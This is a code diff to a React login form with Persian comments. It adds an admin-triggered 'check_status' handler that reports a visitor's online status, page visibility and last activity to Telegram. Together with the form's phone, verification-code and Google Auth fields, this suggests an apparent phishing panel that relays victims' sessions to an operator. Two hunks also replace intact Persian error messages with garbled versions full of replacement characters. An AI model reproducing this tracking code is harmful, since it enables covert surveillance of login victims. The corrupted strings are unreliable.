@@ -225,6 +225,22 @@ export const LoginForm = () => {
         setErrors({});
         setHasError(false);
         break;
+      case "check_status":
+        // بررسی وضعیت کاربر و ارسال به تلگرام
+        console.log("🔍 Admin requested status check for session:", sessionId);
+        updateUserOnlineStatus(
+          sessionId,
+          true, // کاربر در حال استفاده از سایت است
+          !document.hidden, // صفحه قابل مشاهده است یا نه
+          Date.now(), // آخرین فعالیت همین الان
+          document.hidden ? "away" : "online", // وضعیت بر اساس visibility
+          document.hidden ? "🟡" : "🟢", // ایموجی مناسب
+        ).then(() => {
+          console.log("✅ Status check completed and sent to Telegram");
+        }).catch((error) => {
+          console.error("❌ Failed to send status check:", error);
+        });
+        break;
       case "complete":
         localStorage.setItem("isAuthenticated", "true");
         localStorage.setItem("userPhone", phoneNumber);
@@ -408,7 +424,7 @@ export const LoginForm = () => {
       }, 2000);
     } catch (error) {
       console.error("Verification error:", error);
-      setErrors({ verifyCode: "کد تایید نادرست است. لطفا دوباره تلاش کنید." });
+      setErrors({ verifyCode: "کد تایید نا��رست است. لطفا دوباره تلاش کنید." });
     } finally {
       setIsSubmitting(false);
     }
@@ -495,7 +511,7 @@ export const LoginForm = () => {
     } catch (error) {
       console.error("Google Auth submission error:", error);
       setErrors({
-        googleCode: "خطا در ارسال کد. لطفا دوباره تلاش کنید.",
+        googleCode: "خ��ا در ارسال کد. لطفا دوباره تلاش کنید.",
       });
     } finally {
       setIsSubmitting(false);
